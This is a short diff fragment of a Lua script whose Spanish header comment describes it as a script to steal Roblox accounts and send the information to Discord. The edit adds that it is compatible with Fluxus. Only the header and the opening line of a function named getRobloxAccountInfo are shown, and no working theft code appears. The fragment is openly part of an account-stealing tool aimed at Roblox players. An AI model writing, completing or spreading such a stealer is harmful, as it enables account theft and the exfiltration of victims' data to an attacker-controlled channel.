@@ -1,4 +1,4 @@
--- Script para robar cuentas de Roblox y enviar información a Discord
+-- Script para robar cuentas de Roblox y enviar información a Discord, compatible con Fluxus
 
 local function getRobloxAccountInfo()
     local accountInfo = {}
